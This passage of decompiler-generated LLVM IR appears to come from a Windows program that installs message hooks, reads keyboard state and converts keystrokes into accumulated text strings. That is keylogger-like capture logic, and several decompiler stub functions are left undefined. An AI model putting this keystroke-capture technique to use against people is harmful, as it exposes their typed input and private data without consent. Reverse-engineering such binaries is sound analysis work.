  %53 = load i32, i32* %stack_var_16, align 4, !insn.addr !1051
  call void @__writefsdword(i32 0, i32 %53), !insn.addr !1052
  ret i32 0, !insn.addr !1053

dec_label_pc_405b63:                              ; preds = %dec_label_pc_405b12
  %54 = add i32 %25, 1, !insn.addr !1054
  %55 = inttoptr i32 %arg2 to i8*, !insn.addr !1055
  %56 = load i8, i8* %55, align 1, !insn.addr !1055
  %57 = trunc i32 %54 to i8, !insn.addr !1055
  %58 = add i8 %56, %57, !insn.addr !1055
  store i8 %58, i8* %55, align 1, !insn.addr !1055
  ret i32 %54, !insn.addr !1056

dec_label_pc_405b81:                              ; preds = %dec_label_pc_405b09
  %59 = add i32 %2, 104, !insn.addr !1057
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1057
  store i8 0, i8* %60, align 1, !insn.addr !1057
  %61 = ptrtoint i32* %stack_var_4 to i32, !insn.addr !1058
  %62 = add i32 %19, 1, !insn.addr !1059
  %63 = mul i32 %0, 8, !insn.addr !1060
  %64 = add i32 %0, 48, !insn.addr !1060
  %65 = add i32 %64, %63, !insn.addr !1060
  %66 = inttoptr i32 %65 to i8*, !insn.addr !1060
  %67 = load i8, i8* %66, align 1, !insn.addr !1060
  %68 = udiv i32 %62, 256, !insn.addr !1060
  %69 = trunc i32 %68 to i8, !insn.addr !1060
  %70 = add i8 %67, %69, !insn.addr !1060
  store i8 %70, i8* %66, align 1, !insn.addr !1060
  call void @__writefsdword(i32 %62, i32 %61), !insn.addr !1061
  %71 = call i32 @function_407200(), !insn.addr !1062
  %72 = icmp ne i32 %71, 0, !insn.addr !1063
  %73 = icmp eq i1 %72, false, !insn.addr !1064
  store i32 %61, i32* %esp.0.reg2mem, !insn.addr !1065
  br i1 %73, label %dec_label_pc_405c63, label %dec_label_pc_405ba5, !insn.addr !1065

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b81
  switch i32 %1, label %dec_label_pc_405bef [
    i32 8, label %dec_label_pc_405bb3
    i32 46, label %dec_label_pc_405bd2
  ]

dec_label_pc_405bb3:                              ; preds = %dec_label_pc_405ba5
  %74 = call i32 @function_40729c(), !insn.addr !1066
  %75 = call i32 @"@LStrDelete"(), !insn.addr !1067
  store i32 %61, i32* %esp.0.reg2mem, !insn.addr !1068
  br label %dec_label_pc_405c63, !insn.addr !1068

dec_label_pc_405bd2:                              ; preds = %dec_label_pc_405ba5
  %76 = call i32 @function_40729c(), !insn.addr !1069
  %77 = call i32 @"@LStrDelete"(), !insn.addr !1070
  store i32 %61, i32* %esp.0.reg2mem, !insn.addr !1071
  br label %dec_label_pc_405c63, !insn.addr !1071

dec_label_pc_405bef:                              ; preds = %dec_label_pc_405ba5
  %78 = add i32 %2, -260, !insn.addr !1072
  %79 = inttoptr i32 %78 to i8*, !insn.addr !1073
  %80 = call i1 @GetKeyboardState(i8* %79), !insn.addr !1073
  %81 = add i32 %2, -4, !insn.addr !1074
  %82 = udiv i32 %0, 65536, !insn.addr !1075
  %83 = and i32 %82, 255, !insn.addr !1076
  %84 = inttoptr i32 %83 to i16*, !insn.addr !1077
  %85 = ptrtoint i32* %stack_var_-20 to i32, !insn.addr !1078
  %86 = call i32 @ToAscii(i32 0, i32 %81, i8* %79, i16* %84, i32 %1), !insn.addr !1079
  %87 = icmp eq i32 %86, 1, !insn.addr !1080
  %88 = icmp eq i1 %87, false, !insn.addr !1081
  store i32 %85, i32* %esp.0.reg2mem, !insn.addr !1081
  br i1 %88, label %dec_label_pc_405c63, label %dec_label_pc_405c1b, !insn.addr !1081

dec_label_pc_405c1b:                              ; preds = %dec_label_pc_405bef
  %89 = call i32 @function_406f64(), !insn.addr !1082
  %90 = icmp eq i32 %89, 0, !insn.addr !1083
  store i32 %85, i32* %esp.0.reg2mem, !insn.addr !1084
  br i1 %90, label %dec_label_pc_405c63, label %dec_label_pc_405c27, !insn.addr !1084

dec_label_pc_405c27:                              ; preds = %dec_label_pc_405c1b
  %91 = call i32 @function_4034c8(), !insn.addr !1085
  %92 = icmp sgt i32 %91, 15, !insn.addr !1086
  store i32 %85, i32* %esp.0.reg2mem, !insn.addr !1086
  br i1 %92, label %dec_label_pc_405c63, label %dec_label_pc_405c38, !insn.addr !1086

dec_label_pc_405c38:                              ; preds = %dec_label_pc_405c27
  %93 = call i32 @function_40729c(), !insn.addr !1087
  %94 = call i32 @"@LStrFromChar"(), !insn.addr !1088
  %95 = call i32 @"@LStrInsert"(), !insn.addr !1089
  store i32 %85, i32* %esp.0.reg2mem, !insn.addr !1089
  br label %dec_label_pc_405c63, !insn.addr !1089

dec_label_pc_405c63:                              ; preds = %dec_label_pc_405c38, %dec_label_pc_405c27, %dec_label_pc_405c1b, %dec_label_pc_405bef, %dec_label_pc_405bd2, %dec_label_pc_405bb3, %dec_label_pc_405b81
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %96 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1090
  %97 = load i32, i32* %96, align 4, !insn.addr !1090
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1091
  %98 = add i32 %esp.0.reload, 8, !insn.addr !1092
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1092
  store i32 4217987, i32* %99, align 4, !insn.addr !1092
  %100 = call i32 @"@LStrClr"(), !insn.addr !1093
  ret i32 %100, !insn.addr !1094
}

define i32 @function_405c7c() local_unnamed_addr {
dec_label_pc_405c7c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1095
  ret i32 %0, !insn.addr !1095
}

define i32 @function_405c81() local_unnamed_addr {
dec_label_pc_405c81:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1096
}

define i32 @function_405c83(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405c83:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1097
}

define i32 @function_405c8c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405c8c:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1098
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !1098
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1098
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1099
  %2 = call i32 @function_407200(), !insn.addr !1100
  %3 = icmp ne i32 %2, 0, !insn.addr !1101
  %4 = icmp eq i1 %3, false, !insn.addr !1102
  br i1 %4, label %dec_label_pc_405d30, label %dec_label_pc_405cb6, !insn.addr !1103

dec_label_pc_405cb6:                              ; preds = %dec_label_pc_405c8c
  %5 = call i32 @function_406798(), !insn.addr !1104
  br label %dec_label_pc_405d30

dec_label_pc_405d30:                              ; preds = %dec_label_pc_405cb6, %dec_label_pc_405c8c
  %6 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1105
  call void @__writefsdword(i32 0, i32 %6), !insn.addr !1106
  %7 = add i32 %1, 8, !insn.addr !1107
  %8 = inttoptr i32 %7 to i32*, !insn.addr !1107
  store i32 4218194, i32* %8, align 4, !insn.addr !1107
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !1108
  ret i32 %9, !insn.addr !1109
}

define i32 @function_405d4b() local_unnamed_addr {
dec_label_pc_405d4b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1110
  ret i32 %0, !insn.addr !1110
}

define i32 @function_405d50() local_unnamed_addr {
dec_label_pc_405d50:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1111
}

define i32 @function_405d52(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405d52:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1112
}

define i32 @function_405d58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405d58:
  %esp.0.reg2mem = alloca i32, !insn.addr !1113
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1114
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1114
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1114
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1115
  %3 = call i32 @function_407170(), !insn.addr !1116
  %4 = icmp eq i32 %3, 0, !insn.addr !1117
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1118
  br i1 %4, label %dec_label_pc_405dbc, label %dec_label_pc_405d79, !insn.addr !1118

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d58
  %5 = inttoptr i32 %0 to i8*, !insn.addr !1119
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405de0 to i32*), i8* null, i8* %5), !insn.addr !1120
  %7 = ptrtoint i32* %6 to i32, !insn.addr !1120
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !1121
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1121
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !1122
  %10 = icmp eq i1 %9, false, !insn.addr !1123
  br i1 %10, label %dec_label_pc_405db7, label %dec_label_pc_405d94, !insn.addr !1124

dec_label_pc_405d94:                              ; preds = %dec_label_pc_405d79
  %11 = call i32 @function_406fd0(), !insn.addr !1125
  %12 = call i32 @"@LStrAsg"(), !insn.addr !1126
  %13 = call i32 @function_4072f8(), !insn.addr !1127
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !1128
  br label %dec_label_pc_405dbc, !insn.addr !1128

dec_label_pc_405db7:                              ; preds = %dec_label_pc_405d79
  %14 = call i32 @function_40742c(), !insn.addr !1129
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !1129
  br label %dec_label_pc_405dbc, !insn.addr !1129

dec_label_pc_405dbc:                              ; preds = %dec_label_pc_405db7, %dec_label_pc_405d94, %dec_label_pc_405d58
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1130
  %16 = load i32, i32* %15, align 4, !insn.addr !1130
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !1131
  %17 = add i32 %esp.0.reload, 8, !insn.addr !1132
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1132
  store i32 4218329, i32* %18, align 4, !insn.addr !1132
  %19 = call i32 @"@LStrClr"(), !insn.addr !1133
  ret i32 %19, !insn.addr !1134
}

define i32 @function_405dd2() local_unnamed_addr {
dec_label_pc_405dd2:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1135
  ret i32 %0, !insn.addr !1135
}

define i32 @function_405dd7() local_unnamed_addr {
dec_label_pc_405dd7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1136
}

define i32 @function_405dd9(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405dd9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1137
}

define i32 @function_405ddd() local_unnamed_addr {
dec_label_pc_405ddd:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !1138
  %8 = inttoptr i32 %4 to i8*, !insn.addr !1138
  store i8 %7, i8* %8, align 1, !insn.addr !1138
  %9 = add i32 %2, 111, !insn.addr !1139
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1139
  %11 = load i8, i8* %10, align 1, !insn.addr !1139
  %12 = load i32, i32* %eax, align 4, !insn.addr !1139
  %13 = trunc i32 %12 to i8, !insn.addr !1139
  %14 = add i8 %11, %13, !insn.addr !1139
  store i8 %14, i8* %10, align 1, !insn.addr !1139
  %15 = trunc i32 %3 to i16, !insn.addr !1140
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !1140
  %17 = inttoptr i32 %0 to i32*, !insn.addr !1140
  store i32 %16, i32* %17, align 4, !insn.addr !1140
  %18 = add i32 %0, 66, !insn.addr !1141
  %19 = inttoptr i32 %18 to i64*, !insn.addr !1141
  %20 = load i64, i64* %19, align 4, !insn.addr !1141
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !1141
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !1142
  %22 = load i8, i8* %5, align 4, !insn.addr !1143
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !1143
  %25 = add i8 %22, %24, !insn.addr !1143
  %26 = inttoptr i32 %23 to i8*, !insn.addr !1143
  store i8 %25, i8* %26, align 1, !insn.addr !1143
  %27 = add i32 %21, -117, !insn.addr !1144
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1144
  %29 = load i8, i8* %28, align 1, !insn.addr !1144
  %30 = trunc i32 %3 to i8, !insn.addr !1144
  %31 = add i8 %29, %30, !insn.addr !1144
  store i8 %31, i8* %28, align 1, !insn.addr !1144
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !1145
  %33 = add i32 %21, 16, !insn.addr !1146
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1146
  %35 = load i32, i32* %34, align 4, !insn.addr !1146
  %36 = add i32 %21, 12, !insn.addr !1147
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1147
  %38 = load i32, i32* %37, align 4, !insn.addr !1147
  %39 = add i32 %21, 8, !insn.addr !1148
  %40 = inttoptr i32 %39 to i32*, !insn.addr !1148
  %41 = load i32, i32* %40, align 4, !insn.addr !1148
  %42 = load i32, i32* inttoptr (i32 4227376 to i32*), align 16, !insn.addr !1149
  %43 = inttoptr i32 %42 to i32*, !insn.addr !1150
  %44 = load i32, i32* %43, align 4, !insn.addr !1150
  %45 = icmp eq i32 %44, 0, !insn.addr !1150
  %46 = icmp eq i1 %45, false, !insn.addr !1151
  %47 = icmp eq i32 %41, 0, !insn.addr !1152
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !1153
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_405e13, label %dec_label_pc_405e42, !insn.addr !1154

dec_label_pc_405e13:                              ; preds = %dec_label_pc_405ddd
  store i32 %35, i32* %eax, align 4, !insn.addr !1155
  %51 = add i32 %35, 4, !insn.addr !1156
  %52 = inttoptr i32 %51 to i32*, !insn.addr !1156
  %53 = load i32, i32* %52, align 4, !insn.addr !1156
  %54 = icmp eq i32 %53, 770, !insn.addr !1157
  br i1 %54, label %dec_label_pc_405e3b, label %dec_label_pc_405e42, !insn.addr !1158

dec_label_pc_405e3b:                              ; preds = %dec_label_pc_405e13
  %55 = call i32 @function_405c8c(i32 %2, i32 %1, i32 %0), !insn.addr !1159
  br label %dec_label_pc_405e42, !insn.addr !1159

dec_label_pc_405e42:                              ; preds = %dec_label_pc_405ddd, %dec_label_pc_405e13, %dec_label_pc_405e3b
  %56 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !1160
  %57 = inttoptr i32 %35 to i32*, !insn.addr !1161
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !1161
  ret i32 %58, !insn.addr !1162
}

define i32 @function_405e58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405e58:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_408130, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !1163
  %5 = icmp eq i1 %4, false, !insn.addr !1164
  %6 = icmp eq i32 %arg3, 0, !insn.addr !1165
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_405e76, label %dec_label_pc_405e88, !insn.addr !1166

dec_label_pc_405e76:                              ; preds = %dec_label_pc_405e58
  %8 = add i32 %arg1, 8, !insn.addr !1167
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1167
  %10 = load i32, i32* %9, align 4, !insn.addr !1167
  %11 = icmp eq i32 %10, 2, !insn.addr !1168
  %12 = icmp eq i1 %11, false, !insn.addr !1169
  br i1 %12, label %dec_label_pc_405e88, label %dec_label_pc_405e80, !insn.addr !1169

dec_label_pc_405e80:                              ; preds = %dec_label_pc_405e76
  %13 = call i32 @function_405d58(i32 %1, i32 %2, i32 %0), !insn.addr !1170
  br label %dec_label_pc_405e88, !insn.addr !1170

dec_label_pc_405e88:                              ; preds = %dec_label_pc_405e58, %dec_label_pc_405e80, %dec_label_pc_405e76
  %14 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1171
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !1172
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !1172
  ret i32 %16, !insn.addr !1173
}

define i32 @function_405ea0() local_unnamed_addr {
dec_label_pc_405ea0:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4218348 to i32*), i32 3), !insn.addr !1174
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1174
  store i32 %2, i32* @global_var_4096b8, align 4, !insn.addr !1175
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4218456 to i32*), i32 4), !insn.addr !1176
  %5 = ptrtoint i32* %4 to i32, !insn.addr !1176
  store i32 %5, i32* @global_var_4096bc, align 4, !insn.addr !1177
  ret i32 %5, !insn.addr !1178
}

define i32 @function_405ed8() local_unnamed_addr {
dec_label_pc_405ed8:
  %0 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !1179
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1180
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1180
  %3 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1181
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1182
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !1182
  %6 = sext i1 %5 to i32, !insn.addr !1182
  ret i32 %6, !insn.addr !1183
}

define i32 @function_405ef0() local_unnamed_addr {
dec_label_pc_405ef0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1184
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1184
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1184
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1185
  %2 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1186
  %3 = add i32 %2, 1, !insn.addr !1186
  store i32 %3, i32* @global_var_4096b4, align 4, !insn.addr !1186
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1187
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1188
  ret i32 0, !insn.addr !1189
}

define i32 @function_405f15() local_unnamed_addr {
dec_label_pc_405f15:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1190
  ret i32 %0, !insn.addr !1190
}

define i32 @function_405f1a() local_unnamed_addr {
dec_label_pc_405f1a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1191
}

define i32 @function_405f1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f1c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1192
}

define i32 @function_405f20() local_unnamed_addr {
dec_label_pc_405f20:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1193
  %2 = add i32 %1, -1, !insn.addr !1193
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1193
  ret i32 %0, !insn.addr !1194
}

define i32 @function_405f28() local_unnamed_addr {
dec_label_pc_405f28:
  %esp.0.reg2mem = alloca i32, !insn.addr !1195
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1196
  %2 = icmp eq i32 %0, 0, !insn.addr !1197
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1198
  br i1 %2, label %dec_label_pc_406032, label %dec_label_pc_405f42, !insn.addr !1198

dec_label_pc_405f42:                              ; preds = %dec_label_pc_405f28
  %3 = call i32 @function_4036c8(), !insn.addr !1199
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1200
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1200
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1200
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1201
  %7 = icmp eq i1 %6, false, !insn.addr !1202
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1203
  br i1 %7, label %dec_label_pc_406032, label %dec_label_pc_405f5d, !insn.addr !1203

dec_label_pc_405f5d:                              ; preds = %dec_label_pc_405f42
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_406040 to i32*), i8* null, i8* %8), !insn.addr !1204
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1204
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1205
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1205
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1206
  %13 = icmp eq i1 %12, false, !insn.addr !1207
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1208
  br i1 %13, label %dec_label_pc_406032, label %dec_label_pc_405f86, !insn.addr !1208

dec_label_pc_405f86:                              ; preds = %dec_label_pc_405f5d
  %14 = call i32 @function_4034c8(), !insn.addr !1209
  %15 = add i32 %14, 22, !insn.addr !1210
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1211
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1211
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1212
  %18 = icmp eq i32* %17, null, !insn.addr !1213
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1214
  br i1 %18, label %dec_label_pc_406032, label %dec_label_pc_405fa5, !insn.addr !1214

dec_label_pc_405fa5:                              ; preds = %dec_label_pc_405f86
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1215
  %20 = icmp eq i32* %19, null, !insn.addr !1216
  %21 = icmp eq i1 %20, false, !insn.addr !1217
  br i1 %21, label %dec_label_pc_405fb9, label %dec_label_pc_405fb1, !insn.addr !1217

dec_label_pc_405fb1:                              ; preds = %dec_label_pc_405fa5
  %22 = bitcast i32* %17 to i8*, !insn.addr !1218
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1218
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1218
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1219
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1220
  br label %dec_label_pc_406032, !insn.addr !1220

dec_label_pc_405fb9:                              ; preds = %dec_label_pc_405fa5
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1212
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1215
  store i32 20, i32* %19, align 4, !insn.addr !1221
  %27 = add i32 %26, 4, !insn.addr !1222
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1222
  store i32 0, i32* %28, align 4, !insn.addr !1222
  %29 = add i32 %26, 8, !insn.addr !1223
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1223
  store i32 0, i32* %30, align 4, !insn.addr !1223
  %31 = add i32 %26, 12, !insn.addr !1224
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1224
  store i32 0, i32* %32, align 4, !insn.addr !1224
  %33 = add i32 %26, 16, !insn.addr !1225
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1225
  store i32 0, i32* %34, align 4, !insn.addr !1225
  %35 = call i32 @function_4036c8(), !insn.addr !1226
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1227
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1227
  %37 = add i32 %26, 20, !insn.addr !1228
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1229
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1230
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1231
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1232
  %42 = call i32 @function_406edc(i32 4218952, i32 2000, i32 -1), !insn.addr !1233
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1234
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1234
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1235
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1235
  %46 = icmp eq i1 %45, false, !insn.addr !1236
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1237
  br i1 %46, label %dec_label_pc_406032, label %dec_label_pc_406023, !insn.addr !1237

dec_label_pc_406023:                              ; preds = %dec_label_pc_405fb9
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1238
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1238
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1239
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1239
  br label %dec_label_pc_406032, !insn.addr !1239

dec_label_pc_406032:                              ; preds = %dec_label_pc_406023, %dec_label_pc_405fb9, %dec_label_pc_405fb1, %dec_label_pc_405f86, %dec_label_pc_405f5d, %dec_label_pc_405f42, %dec_label_pc_405f28
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1240
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1240
  %51 = load i32, i32* %50, align 4, !insn.addr !1240
  ret i32 %51, !insn.addr !1241
}

define i32 @function_40603d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_40603d:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1242
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1242
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1242
  store i8 %6, i8* %7, align 1, !insn.addr !1242
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1243
  %10 = udiv i32 %4, 256, !insn.addr !1243
  %11 = trunc i32 %10 to i8, !insn.addr !1243
  %12 = add i8 %9, %11, !insn.addr !1243
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1243
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1243
  store i8 %12, i8* %14, align 1, !insn.addr !1243
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1244
  %17 = add i32 %4, 6, !insn.addr !1244
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1244
  %19 = zext i1 %16 to i32, !insn.addr !1244
  %20 = and i32 %4, -65536, !insn.addr !1244
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1245
  %23 = or i1 %16, %22, !insn.addr !1245
  %24 = add i32 %18, 6, !insn.addr !1245
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1245
  %26 = zext i1 %23 to i32, !insn.addr !1245
  %27 = and i32 %25, 15, !insn.addr !1245
  %28 = or i32 %27, %20, !insn.addr !1245
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1245
  %31 = or i32 %28, %30, !insn.addr !1245
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1246
  %33 = load i8, i8* %32, align 1, !insn.addr !1246
  %34 = trunc i32 %27 to i8, !insn.addr !1246
  %35 = xor i8 %33, %34, !insn.addr !1246
  store i8 %35, i8* %32, align 1, !insn.addr !1246
  %36 = add i32 %0, 1311123697, !insn.addr !1247
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1247
  %38 = load i8, i8* %37, align 1, !insn.addr !1247
  %39 = udiv i32 %3, 256, !insn.addr !1247
  %40 = trunc i32 %39 to i8, !insn.addr !1247
  %41 = add i8 %38, %40, !insn.addr !1247
  store i8 %41, i8* %37, align 1, !insn.addr !1247
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1248
  %43 = load i32, i32* %42, align 4, !insn.addr !1248
  %44 = sub i32 %43, %31, !insn.addr !1248
  store i32 %44, i32* %42, align 4, !insn.addr !1248
